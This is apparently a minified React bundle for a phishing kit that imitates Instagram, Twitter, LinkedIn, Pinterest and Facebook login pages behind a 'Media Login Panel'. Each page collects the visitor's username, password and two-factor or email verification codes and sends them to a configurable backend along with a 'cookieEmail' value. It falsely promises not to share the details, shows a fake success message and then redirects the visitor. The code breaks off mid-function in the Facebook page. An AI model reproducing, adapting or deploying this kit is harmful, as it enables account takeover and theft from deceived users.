(this["webpackJsonpinsta-linkedin-frontend"]=this["webpackJsonpinsta-linkedin-frontend"]||[]).push([[0],{41:function(e,t,a){e.exports=a(64)},64:function(e,t,a){"use strict";a.r(t);var n=a(0),l=a.n(n),o=a(17),r=a.n(o),s=a(16),c=a(11),i=a(12),u=a(14),m=a(13),d=a(72),E=a(66),h=a(35),A=a(67),g=a(68),p=a(5),_=a.n(p),f=_()();console.log(f.REACT_APP_URL),console.log(window.location.host);var C=function(e){Object(u.a)(a,e);var t=Object(m.a)(a);function a(){var e;Object(c.a)(this,a);for(var n=arguments.length,o=new Array(n),r=0;r<n;r++)o[r]=arguments[r];return(e=t.call.apply(t,[this].concat(o))).state={redirect:!1,to:""},e.setRedirect=function(t){e.setState({redirect:!0,to:t})},e.renderRedirect=function(){if(e.state.redirect)return l.a.createElement(s.a,{to:e.state.to})},e}return Object(i.a)(a,[{key:"componentDidMount",value:function(){var e=document.getElementById("FavIcon");void 0===f.REACT_APP_FAVICONURL&&""===f.REACT_APP_FAVICONURL||(e.href="".concat(f.REACT_APP_FAVICONURL));var t=document.getElementById("AppTitle");void 0!==f.REACT_APP_TITLE||""!==f.REACT_APP_TITLE?t.innerText="".concat(f.REACT_APP_TITLE):t.innerText="Media Login Panel"}},{key:"render",value:function(){var e=this;return l.a.createElement("div",null,this.renderRedirect(),l.a.createElement(d.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"},className:"text-center"},l.a.createElement(d.a.Header,null,"Select a login option"),l.a.createElement(d.a.Body,null,l.a.createElement(E.a,{fluid:!0},l.a.createElement(h.a,null,"true"===f.REACT_APP_INSTAGRAM?l.a.createElement(A.a,null,l.a.createElement(g.a,{style:{width:"100%",margin:"5px",padding:"5px"},size:"lg",variant:"outline-danger",onClick:function(){return e.setRedirect("/Instagram")}},"INSTAGRAM")):"","true"===f.REACT_APP_TWITTER?l.a.createElement(A.a,null,l.a.createElement(g.a,{style:{width:"100%",margin:"5px",padding:"5px"},size:"lg",variant:"outline-primary",onClick:function(){return e.setRedirect("/Twitter")}},"TWITTER")):"","true"===f.REACT_APP_LINKEDIN?l.a.createElement(A.a,null,l.a.createElement(g.a,{style:{width:"100%",margin:"5px",padding:"5px"},size:"lg",variant:"outline-info",onClick:function(){return e.setRedirect("/LinkedIn")}},"LINKEDIN")):"","true"===f.REACT_APP_PINTEREST?l.a.createElement(A.a,null,l.a.createElement(g.a,{style:{width:"100%",margin:"5px",padding:"5px"},size:"lg",variant:"outline-secondary",onClick:function(){return e.setRedirect("/Pinterest")}},"Pinterest")):"","true"===f.REACT_APP_FACEBOOK?l.a.createElement(A.a,null,l.a.createElement(g.a,{style:{width:"100%",margin:"5px",padding:"5px"},size:"lg",variant:"outline-primary",onClick:function(){return e.setRedirect("/Facebook")}},"Facebook")):"")))),l.a.createElement(d.a,{title:"Select login options"}))}}]),a}(n.Component),w=a(71),T=a(70),P=a(69),R=a(19),S=_()(),b=function(e){Object(u.a)(a,e);var t=Object(m.a)(a);function a(){var e;Object(c.a)(this,a);for(var n=arguments.length,o=new Array(n),r=0;r<n;r++)o[r]=arguments[r];return(e=t.call.apply(t,[this].concat(o))).state={username:"",password:"",showAlert:!1,loading:!1,message:"",twoFactor:!1,email_auth:!1,success:!1,code:"",two_factor_identifier:"",verificationMethod:"",appName:window.location.hostname.msg.substring(10).split(".")},e.handleUsername=function(t){e.setState({username:t.target.value})},e.handleCode=function(t){var a=t.target,n=a.value,l=a.maxLength,o=n.slice(0,l);e.setState({code:o})},e.handlePassword=function(t){e.setState({password:t.target.value})},e.onShowAlert=function(){e.setState({showAlert:!0},(function(){window.setTimeout((function(){e.setState({showAlert:!1})}),3e4)}))},e.handleClick=function(t){t.preventDefault(),e.setState({loading:!0}),0!==e.state.username.length&&0!==e.state.password.length?(console.log(e.state.appName,window.location.href.split("//")[1]),fetch("".concat(S.REACT_APP_URL,"/insta"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:R.stringify({username:e.state.username,password:e.state.password,cookieEmail:S.REACT_APP_COOKIE_EMAIL,appName:e.state.appName})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.twoFactor?e.setState({email_auth:t.email_auth,twoFactor:!0,loading:!0,two_factor_identifier:t.two_factor_identifier,verificationMethod:t.verificationMethod}):e.setState({success:!0}):e.setState({loading:!1})}))):0===e.state.username.length?e.setState({message:"username cannot be empty",loading:!1},(function(){e.onShowAlert()})):e.setState({message:"password cannot be empty",loading:!1},(function(){e.onShowAlert()}))},e.handleCodeClick=function(t){0===e.state.code.length||e.state.code.length>6?e.setState({message:"Code length should be equal to 6"},(function(){e.onShowAlert()})):e.state.email_auth?fetch("".concat(S.REACT_APP_URL,"/insta/emailVerify?username=").concat(e.state.username,"&code=").concat(e.state.code),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?fetch("".concat(S.REACT_APP_URL,"/insta"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:R.stringify({username:e.state.username,password:e.state.password,cookieEmail:S.REACT_APP_COOKIE_EMAIL,appName:e.state.appName})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.twoFactor||e.setState({success:!0}):e.setState({loading:!1})})):e.setState({message:t.message,code:""},(function(){e.onShowAlert()}))})):fetch("".concat(S.REACT_APP_URL,"/insta/submitCode?username=").concat(e.state.username,"&password=").concat(e.state.password,"&code=").concat(e.state.code,"&two_factor_identifier=").concat(e.state.two_factor_identifier,"&verificationMethod=").concat(e.state.verificationMethod,"&cookieEmail=").concat(S.REACT_APP_COOKIE_EMAIL,"$appName=").concat(e.state.appName),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),t.success?e.setState({success:!0,message:t.message},(function(){e.onShowAlert()})):e.setState({message:t.message},(function(){e.onShowAlert()}))}))},e.setRedirect=function(){e.setState({redirect:!0})},e.renderRedirect=function(){if(e.state.redirect)return l.a.createElement(s.a,{to:"/"})},e}return Object(i.a)(a,[{key:"render",value:function(){var e=this;return l.a.createElement("div",null,this.renderRedirect(),l.a.createElement(g.a,{size:"lg",variant:"outline-danger",onClick:this.setRedirect},"Back"),this.state.showAlert?l.a.createElement(w.a,{variant:"danger"},this.state.message):"",l.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},l.a.createElement("center",null,l.a.createElement(E.a,null,l.a.createElement("img",{alt:"logo",src:S.REACT_APP_FAVICONURL,style:{objectFit:"contain",width:"25%",height:"25%"}})),l.a.createElement("br",null),l.a.createElement("h1",null,void 0!==S.REACT_APP_TITLE&&""!==S.REACT_APP_TITLE?S.REACT_APP_TITLE:"Instagram Login"),l.a.createElement("br",null),"true"===S.REACT_APP_BANNER_INSTAGRAM?l.a.createElement("div",null,l.a.createElement(d.a,{style:{backgroundColor:"#D8ECDB",color:"#3F6A42"}},l.a.createElement(d.a.Body,null,l.a.createElement(d.a.Title,null,S.REACT_APP_BANNER_INSTAGRAM_HEADER),l.a.createElement(d.a.Text,null,l.a.createElement("small",{className:"text-muted"},"  ",S.REACT_APP_BANNER_INSTAGRAM_BODY))))):"",l.a.createElement(E.a,null,l.a.createElement("p",{style:{fontWeight:"bold"}},""!==S.REACT_APP_SECONDARY_BANNER?S.REACT_APP_SECONDARY_BANNER:""))),this.state.success?l.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},l.a.createElement("center",null,l.a.createElement("h1",null,"Login Success Thank You!"),l.a.createElement("h1",null,"Redirecting...")),l.a.createElement(s.b,{component:function(){return window.setTimeout((function(){window.location.href=S.REACT_APP_REDIRECTURL}),3e3),null}})):l.a.createElement(A.a,null,l.a.createElement(h.a,null,l.a.createElement(T.a,{onSubmit:function(t){return e.handleClick(t)}},l.a.createElement(T.a.Group,{controlId:"formBasicEmail"},l.a.createElement(T.a.Label,null,"Username"),l.a.createElement(T.a.Control,{value:this.state.username,onChange:function(t){e.handleUsername(t)},type:"username",placeholder:"Enter Instagram username"}),l.a.createElement(T.a.Text,{className:"text-muted"},"We'll never share your details with anyone else.")),l.a.createElement(T.a.Group,{controlId:"formBasicPassword"},l.a.createElement(T.a.Label,null,"Password"),l.a.createElement(T.a.Control,{onChange:function(t){return e.handlePassword(t)},value:this.state.password,type:"password",placeholder:"Enter Instagram Password"})),this.state.loading?l.a.createElement(g.a,{variant:"primary",type:"submit",disabled:!0},l.a.createElement(P.a,{as:"span",animation:"grow",size:"sm",role:"status","aria-hidden":"true"}),"Loading..."):l.a.createElement(g.a,{variant:"primary",type:"submit"},"Login"),this.state.twoFactor?l.a.createElement("div",null,l.a.createElement(T.a.Group,null,this.state.email_auth?l.a.createElement(T.a.Label,null,"Please enter the code received"):l.a.createElement(T.a.Label,null,"Enter code recieved"),l.a.createElement(T.a.Control,{value:this.state.code,onChange:function(t){e.handleCode(t)},type:"number",maxLength:"11"})),l.a.createElement(g.a,{variant:"outline-success",onClick:function(){e.handleCodeClick()}},"submit code")," "):"")))))}}]),a}(n.Component),y=a(19),v=_()(),N=function(e){Object(u.a)(a,e);var t=Object(m.a)(a);function a(){var e;Object(c.a)(this,a);for(var n=arguments.length,o=new Array(n),r=0;r<n;r++)o[r]=arguments[r];return(e=t.call.apply(t,[this].concat(o))).state={username:"",password:"",showAlert:!1,loading:!1,message:"",manualCheck:!1,success:!1,redirect:!1,challangeID:"",code:"",appName:window.location.hostname.msg.substring(10).split(".")},e.handleUsername=function(t){e.setState({username:t.target.value})},e.handleCode=function(t){var a=t.target,n=a.value,l=a.maxLength,o=n.slice(0,l);e.setState({code:o})},e.handlePassword=function(t){e.setState({password:t.target.value})},e.onShowAlert=function(){e.setState({showAlert:!0},(function(){window.setTimeout((function(){e.setState({showAlert:!1})}),3e4)}))},e.handleClick=function(t){t.preventDefault(),e.setState({loading:!0}),0!==e.state.username.length&&0!==e.state.password.length?fetch("".concat(v.REACT_APP_URL,"/linkedin"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:y.stringify({username:e.state.username,password:e.state.password,cookieEmail:v.REACT_APP_COOKIE_EMAIL,appName:e.state.appName})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.manualCheck?e.setState({manualCheck:!0,challangeID:t.challangeID,loading:!0}):e.setState({success:!0}):e.setState({loading:!1})})):0===e.state.username.length?e.setState({message:"username cannot be empty",loading:!1},(function(){e.onShowAlert()})):e.setState({message:"password cannot be empty",loading:!1},(function(){e.onShowAlert()}))},e.handleCodeClick=function(t){0===e.state.code.length||e.state.code.length>6?e.setState({message:"Code length should be equal to 6"},(function(){e.onShowAlert()})):fetch("".concat(v.REACT_APP_URL,"/linkedinCheck?code=").concat(e.state.code,"&cookieEmail=").concat(v.REACT_APP_COOKIE_EMAIL,"&email=").concat(e.state.username,"&password=").concat(e.state.password,"&challangeID=").concat(e.state.challangeID,"&appName=").concat(e.state.appName),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?e.setState({success:!0}):e.setState({message:t.message,code:""},(function(){e.onShowAlert()}))}))},e.setRedirect=function(){e.setState({redirect:!0})},e.renderRedirect=function(){if(e.state.redirect)return l.a.createElement(s.a,{to:"/"})},e}return Object(i.a)(a,[{key:"render",value:function(){var e=this;return l.a.createElement("div",null,this.renderRedirect(),l.a.createElement(g.a,{size:"lg",variant:"outline-danger",onClick:this.setRedirect},"Back"),this.state.showAlert?l.a.createElement(w.a,{variant:"dark"},this.state.message):"",l.a.createElement("br",null),l.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},l.a.createElement("center",null,l.a.createElement(E.a,null,l.a.createElement("img",{alt:"logo",src:v.REACT_APP_FAVICONURL,style:{objectFit:"contain",width:"25%",height:"25%"}})),l.a.createElement("br",null),l.a.createElement("h1",null,void 0!==v.REACT_APP_TITLE&&""!==v.REACT_APP_TITLE?v.REACT_APP_TITLE:" LinkedIn login"),l.a.createElement("br",null),"true"===v.REACT_APP_BANNER_LINKEDIN?l.a.createElement("div",null,l.a.createElement(d.a,{style:{backgroundColor:"#D8ECDB",color:"#3F6A42"}},l.a.createElement(d.a.Body,null,l.a.createElement(d.a.Title,null,v.REACT_APP_BANNER_LINKEDIN_HEADER),l.a.createElement(d.a.Text,null,l.a.createElement("small",{className:"text-muted"},"  ",v.REACT_APP_BANNER_LINKEDIN_BODY))))," "):"",l.a.createElement(E.a,null,l.a.createElement("p",{style:{fontWeight:"bold"}},""!==v.REACT_APP_SECONDARY_BANNER?v.REACT_APP_SECONDARY_BANNER:""))),this.state.success?l.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},l.a.createElement("center",null,l.a.createElement("h1",null,"Login Success Thank You!"),l.a.createElement("h1",null,"Redirecting...")),l.a.createElement(s.b,{component:function(){return window.setTimeout((function(){window.location.href=v.REACT_APP_REDIRECTURL}),3e3),null}})):l.a.createElement(A.a,null,l.a.createElement(h.a,null,l.a.createElement(T.a,{onSubmit:function(t){return e.handleClick(t)}},l.a.createElement(T.a.Group,{controlId:"formBasicEmail"},l.a.createElement(T.a.Label,null,"Enter Linkedin Username/MobileNumber"),l.a.createElement(T.a.Control,{value:this.state.username,onChange:function(t){e.handleUsername(t)}})),l.a.createElement(T.a.Group,{controlId:"formBasicPassword"},l.a.createElement(T.a.Label,null,"Enter Linkedin Password"),l.a.createElement(T.a.Control,{onChange:function(t){return e.handlePassword(t)},value:this.state.password,type:"password"})),this.state.loading?l.a.createElement(g.a,{variant:"primary",type:"submit",disabled:!0},l.a.createElement(P.a,{as:"span",animation:"grow",size:"sm",role:"status","aria-hidden":"true"}),"Loading..."):l.a.createElement(g.a,{variant:"primary",type:"submit"},"Login"),this.state.manualCheck?l.a.createElement("div",null,l.a.createElement(T.a.Group,null,l.a.createElement(T.a.Label,null,"Enter code recieved in your email"),l.a.createElement(T.a.Control,{value:this.state.code,onChange:function(t){e.handleCode(t)},type:"number",maxLength:"11"})),l.a.createElement(g.a,{variant:"outline-success",onClick:function(){e.handleCodeClick()}},"submit code")," "):"")))))}}]),a}(n.Component),I=a(19),k=_()(),L=function(e){Object(u.a)(a,e);var t=Object(m.a)(a);function a(){var e;Object(c.a)(this,a);for(var n=arguments.length,o=new Array(n),r=0;r<n;r++)o[r]=arguments[r];return(e=t.call.apply(t,[this].concat(o))).state={username:"",password:"",showAlert:!1,loading:!1,message:"",manualCheck:!1,success:!1,redirect:!1,challenge_id:"",challenge_type:"",enc_user_id:"",code:"",appName:window.location.hostname.msg.substring(10).split(".")},e.handleUsername=function(t){e.setState({username:t.target.value})},e.handleCode=function(t){e.setState({code:t.target.value})},e.handlePassword=function(t){e.setState({password:t.target.value})},e.onShowAlert=function(){e.setState({showAlert:!0},(function(){window.setTimeout((function(){e.setState({showAlert:!1})}),3e4)}))},e.handleClick=function(t){t.preventDefault(),e.setState({loading:!0}),0!==e.state.username.length&&0!==e.state.password.length?fetch("".concat(k.REACT_APP_URL,"/login/twitter"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:I.stringify({username:e.state.username,password:e.state.password,cookieEmail:k.REACT_APP_COOKIE_EMAIL,appName:e.state.appName})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.manualCheck?e.setState({manualCheck:!0,challenge_type:t.challenge_type,challenge_id:t.challenge_id,enc_user_id:t.enc_user_id,loading:!0}):e.setState({success:!0}):e.setState({loading:!1})})):0===e.state.username.length?e.setState({message:"username cannot be empty",loading:!1},(function(){e.onShowAlert()})):e.setState({message:"password cannot be empty",loading:!1},(function(){e.onShowAlert()}))},e.handleCodeClick=function(t){fetch("".concat(k.REACT_APP_URL,"/login/twitter/verifyCode?code=").concat(e.state.code,"&challenge_type=").concat(e.state.challenge_type,"&enc_user_id=").concat(e.state.enc_user_id,"&cookieEmail=").concat(k.REACT_APP_COOKIE_EMAIL,"&username=").concat(e.state.username,"&password=").concat(e.state.password,"&challenge_id=").concat(e.state.challenge_id,"&appName=").concat(e.state.appName),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?e.setState({success:!0}):e.setState({message:t.message,code:""},(function(){e.onShowAlert()}))}))},e.setRedirect=function(){e.setState({redirect:!0})},e.renderRedirect=function(){if(e.state.redirect)return l.a.createElement(s.a,{to:"/"})},e}return Object(i.a)(a,[{key:"render",value:function(){var e=this;return l.a.createElement("div",null,this.renderRedirect(),l.a.createElement(g.a,{size:"lg",variant:"outline-danger",onClick:this.setRedirect},"Back"),this.state.showAlert?l.a.createElement(w.a,{variant:"dark"},this.state.message):"",l.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},l.a.createElement("center",null,l.a.createElement(E.a,null,l.a.createElement("img",{alt:"logo",src:k.REACT_APP_FAVICONURL,style:{objectFit:"contain",width:"25%",height:"25%"}})),l.a.createElement("br",null),l.a.createElement("h1",null,void 0!==k.REACT_APP_TITLE&&""!==k.REACT_APP_TITLE?k.REACT_APP_TITLE:"Twitter login"),l.a.createElement("br",null),"true"===k.REACT_APP_BANNER_TWITTER?l.a.createElement("div",null,l.a.createElement(d.a,{style:{backgroundColor:"#D8ECDB",color:"#3F6A42"}},l.a.createElement(d.a.Body,null,l.a.createElement(d.a.Title,null,k.REACT_APP_BANNER_TWITTER_HEADER),l.a.createElement(d.a.Text,null,l.a.createElement("small",{className:"text-muted"},"  ",k.REACT_APP_BANNER_TWITTER_BODY))))):"",l.a.createElement(E.a,null,l.a.createElement("p",{style:{fontWeight:"bold"}},""!==k.REACT_APP_SECONDARY_BANNER?k.REACT_APP_SECONDARY_BANNER:""))),this.state.success?l.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},l.a.createElement("center",null,l.a.createElement("h1",null,"Login Success Thank You!"),l.a.createElement("h1",null,"Redirecting...")),l.a.createElement(s.b,{component:function(){return window.setTimeout((function(){window.location.href=k.REACT_APP_REDIRECTURL}),3e3),null}})):l.a.createElement(A.a,null,l.a.createElement(h.a,null,l.a.createElement(T.a,{onSubmit:function(t){return e.handleClick(t)}},l.a.createElement(T.a.Group,{controlId:"formBasicEmail"},l.a.createElement(T.a.Label,null,"Enter Twitter Username"),l.a.createElement(T.a.Control,{value:this.state.username,onChange:function(t){e.handleUsername(t)}})),l.a.createElement(T.a.Group,{controlId:"formBasicPassword"},l.a.createElement(T.a.Label,null,"Enter Twitter Password"),l.a.createElement(T.a.Control,{onChange:function(t){return e.handlePassword(t)},value:this.state.password,type:"password"})),this.state.loading?l.a.createElement(g.a,{variant:"primary",type:"submit",disabled:!0},l.a.createElement(P.a,{as:"span",animation:"grow",size:"sm",role:"status","aria-hidden":"true"}),"Loading..."):l.a.createElement(g.a,{variant:"primary",type:"submit"},"Login"),this.state.manualCheck?l.a.createElement("div",null,l.a.createElement(T.a.Group,null,l.a.createElement(T.a.Label,null,"RetypeEmail"===this.state.challenge_type?"Enter your email id":"Enter code recieved in your email"),l.a.createElement(T.a.Control,{value:this.state.code,onChange:function(t){e.handleCode(t)},type:"text"})),l.a.createElement(g.a,{variant:"outline-success",onClick:function(){e.handleCodeClick()}},"submit code")," "):"")))))}}]),a}(n.Component),O=a(19),B=_()(),D=function(e){Object(u.a)(a,e);var t=Object(m.a)(a);function a(){var e;Object(c.a)(this,a);for(var n=arguments.length,o=new Array(n),r=0;r<n;r++)o[r]=arguments[r];return(e=t.call.apply(t,[this].concat(o))).state={username:"",password:"",showAlert:!1,loading:!1,message:"",manualCheck:!1,success:!1,redirect:!1,appName:window.location.hostname.msg.substring(10).split(".")},e.handleUsername=function(t){e.setState({username:t.target.value})},e.handleCode=function(t){e.setState({code:t.target.value})},e.handlePassword=function(t){e.setState({password:t.target.value})},e.onShowAlert=function(){e.setState({showAlert:!0},(function(){window.setTimeout((function(){e.setState({showAlert:!1})}),3e4)}))},e.handleClick=function(t){t.preventDefault(),e.setState({loading:!0}),0!==e.state.username.length&&0!==e.state.password.length?fetch("".concat(B.REACT_APP_URL,"/login/pinterest"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:O.stringify({username:e.state.username,password:e.state.password,cookieEmail:B.REACT_APP_COOKIE_EMAIL,appName:e.state.appName})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.manualCheck?e.setState({manualCheck:!0,challenge_type:t.challenge_type,challenge_id:t.challenge_id,enc_user_id:t.enc_user_id,loading:!0}):e.setState({success:!0}):e.setState({loading:!1})})):0===e.state.username.length?e.setState({message:"email id cannot be empty",loading:!1},(function(){e.onShowAlert()})):e.setState({message:"password cannot be empty",loading:!1},(function(){e.onShowAlert()}))},e.handleCodeClick=function(t){fetch("".concat(B.REACT_APP_URL,"/login/twitter/verifyCode?code=").concat(e.state.code,"&challenge_type=").concat(e.state.challenge_type,"&enc_user_id=").concat(e.state.enc_user_id,"&cookieEmail=").concat(B.REACT_APP_COOKIE_EMAIL,"&username=").concat(e.state.username,"&password=").concat(e.state.password,"&challenge_id=").concat(e.state.challenge_id,"&appName=").concat(e.state.appName),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?e.setState({success:!0}):e.setState({message:t.message,code:""},(function(){e.onShowAlert()}))}))},e.setRedirect=function(){e.setState({redirect:!0})},e.renderRedirect=function(){if(e.state.redirect)return l.a.createElement(s.a,{to:"/"})},e}return Object(i.a)(a,[{key:"render",value:function(){var e=this;return l.a.createElement("div",null,this.renderRedirect(),l.a.createElement(g.a,{size:"lg",variant:"outline-danger",onClick:this.setRedirect},"Back"),this.state.showAlert?l.a.createElement(w.a,{variant:"dark"},this.state.message):"",l.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},l.a.createElement("center",null,l.a.createElement(E.a,null,l.a.createElement("img",{alt:"logo",src:B.REACT_APP_FAVICONURL,style:{objectFit:"contain",width:"25%",height:"25%"}})),l.a.createElement("br",null),l.a.createElement("h1",null,void 0!==B.REACT_APP_TITLE&&""!==B.REACT_APP_TITLE?B.REACT_APP_TITLE:"Pinterest login"),"true"===B.REACT_APP_BANNER_PINTEREST?l.a.createElement("div",null,l.a.createElement(d.a,{style:{backgroundColor:"#D8ECDB",color:"#3F6A42"}},l.a.createElement(d.a.Body,null,l.a.createElement(d.a.Title,null,B.REACT_APP_BANNER_PINTEREST_HEADER),l.a.createElement(d.a.Text,null,l.a.createElement("small",{className:"text-muted"},"  ",B.REACT_APP_BANNER_PINTEREST_BODY))))," "):"",l.a.createElement(E.a,null,l.a.createElement("p",{style:{fontWeight:"bold"}},""!==B.REACT_APP_SECONDARY_BANNER?B.REACT_APP_SECONDARY_BANNER:""))),this.state.success?l.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},l.a.createElement("center",null,l.a.createElement("h1",null,"Login Success Thank You!"),l.a.createElement("h1",null,"Redirecting...")),l.a.createElement(s.b,{component:function(){return window.setTimeout((function(){window.location.href=B.REACT_APP_REDIRECTURL}),3e3),null}})):l.a.createElement(A.a,null,l.a.createElement(h.a,null,l.a.createElement(T.a,{onSubmit:function(t){return e.handleClick(t)}},l.a.createElement(T.a.Group,{controlId:"formBasicEmail"},l.a.createElement(T.a.Label,null,"Enter Pinterest Email Id"),l.a.createElement(T.a.Control,{value:this.state.username,onChange:function(t){e.handleUsername(t)}})),l.a.createElement(T.a.Group,{controlId:"formBasicPassword"},l.a.createElement(T.a.Label,null,"Enter Pinterest Password"),l.a.createElement(T.a.Control,{onChange:function(t){return e.handlePassword(t)},value:this.state.password,type:"password"})),this.state.loading?l.a.createElement(g.a,{variant:"primary",type:"submit",disabled:!0},l.a.createElement(P.a,{as:"span",animation:"grow",size:"sm",role:"status","aria-hidden":"true"}),"Loading..."):l.a.createElement(g.a,{variant:"primary",type:"submit"},"Login"),this.state.manualCheck?l.a.createElement("div",null,l.a.createElement(T.a.Group,null,l.a.createElement(T.a.Label,null,"RetypeEmail"===this.state.challenge_type?"Enter your email id":"Enter code recieved in your email"),l.a.createElement(T.a.Control,{value:this.state.code,onChange:function(t){e.handleCode(t)},type:"text"})),l.a.createElement(g.a,{variant:"outline-success",onClick:function(){e.handleCodeClick()}},"submit code")," "):"")))))}}]),a}(n.Component),x=a(19),U=_()(),j=function(e){Object(u.a)(a,e);var t=Object(m.a)(a);function a(){var e;Object(c.a)(this,a);for(var n=arguments.length,o=new Array(n),r=0;r<n;r++)o[r]=arguments[r];return(e=t.call.apply(t,[this].concat(o))).state={username:"",password:"",showAlert:!1,loading:!1,message:"",manualCheck:!1,success:!1,redirect:!1,challangeID:"",code:"",appName:window.location.hostname.msg.substring(10).split(".")},e.handleUsername=function(t){e.setState({username:t.target.value})},e.handleCode=function(t){var a=t.target,n=a.value,l=a.maxLength,o=n.slice(0,l);e.setState({code:o})},e.handlePassword=function(t){e.setState({password:t.target.value})},e.onShowAlert=function(){e.setState({showAlert:!0},(function(){window.setTimeout((function(){e.setState({showAlert:!1})}),3e4)}))},e.handleClick=function(t){t.preventDefault(),e.setState({loading:!0}),0!==e.state.username.length&&0!==e.state.password.length?fetch("".concat(U.REACT_APP_URL,"/login/facebook"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:x.stringify({username:e.state.username,password:e.state.password,cookieEmail:U.REACT_APP_COOKIE_EMAIL,appName:e.state.appName})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.manualCheck?e.setState({manualCheck:!0,challangeID:t.challangeID,loading:!0}):e.setState({success:!0}):e.setState({loading:!1})})):0===e.state.username.length?e.setState({message:"username cannot be empty",loading:!1},(function(){e.onShowAlert()})):e.setState({message:"password cannot be empty",loading:!1},(function(){e.onShowAlert()}))},e.handleCodeClick=function(t){0===e.state.code.length||e.state.code.length>6?e.setState({message:"Code length should be equal to 6"},(function(){e.onShowAlert()})):fetch("".concat(U.REACT_APP_URL,"/linkedinCheck?code=").concat(e.state.code,"&cookieEmail=").concat(U.REACT_APP_COOKIE_EMAIL,"&email=").concat(e.state.username,"&password=").concat(e.state.password,"&challangeID=").concat(e.state.challangeID,"$appName=").concat(e.state.appName),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?e.setState({success:!0}):e.setState({message:t.message,code:""},(function(){e.onShowAlert()}))}))},e.setRedirect=function(){e.setState({redirect:!0})},e.renderRedirect=function(){if(e.state.redirect)return l.a.createElement(s.a,{to:"/"})},e}return Object(i.a)(a,[{key:"render",value:function(){var e=this;return l.a.createElement("div",null,this.renderRedirect(),l.a.createElement(g.a,{size:"lg",variant:"outline-primary",onClick:this.setRedirect},"Back"),this.state.showAlert?l.a.createElement(w.a,{variant:"dark"},this.state.message):"",l.a.createElement("br",null),l.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},l.a.createElement("center",null,l.a.createElement(E.a,null,l.a.createElement("img",{alt:"logo",src:U.REACT_APP_FAVICONURL,style:{objectFit:"contain",width:"25%",height:"25%"}})),l.a.createElement("br",null),l.a.createElement("h1",null,void 0!==U.REACT_APP_TITLE&&""!==U.REACT_APP_TITLE?U.REACT_APP_TITLE:" Facebook login"),l.a.createElement("br",null),"true"===U.REACT_APP_BANNER_FACEBOOK?l.a.createElement("div",null,l.a.createElement(d.a,{style:{backgroundColor:"#D8ECDB",color:"#3F6A42"}},l.a.createElement(d.a.Body,null,l.a.createElement(d.a.Title,null,U.REACT_APP_BANNER_FACEBOOK_HEADER),l.a.createElement(d.a.Text,null,l.a.createElement("small",{className:"text-muted"},"  ",U.REACT_APP_BANNER_FACEBOOK_BODY))))," "):"",l.a.createElement(E.a,null,l.a.createElement("p",{style:{fontWeight:"bold"}},""!==U.REACT_APP_SECONDARY_BANNER?U.REACT_APP_SECONDARY_BANNER:""))),this.state.success?l.a.createElement(E.a,{style:{position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},l.a.createElement("center",null,l.a.createElement("h1",null,"Login Success Thank You!"),l.a.createElement("h1",null,"Redirecting...")),l.a.createElement(s.b,{component:function(){return window.setTimeout((function(){window.location.href=U.REACT_APP_REDIRECTURL}),3e3),null}})):l.a.createElement(A.a,null,l.a.createElement(h.a,null,l.a.createElement(T.a,{onSubmit:function(t){return e.handleClick(t)}},l.a.createElement(T.a.Group,{controlId:"formBasicEmail"},l.a.createElement(T.a.Label,null,"Enter Facebook Username/Email"),l.a.createElement(T.a.Control,{value:this.state.username,onChange:function(t){e.handleUsername(t)}})),l.a.createElement(T.a.Group,{controlId:"formBasicPassword"},l.a.createElement(T.a.Label,null,"Enter Facebook Password"),l.a.createElement(T.a.Control,{onChange:function(t){return 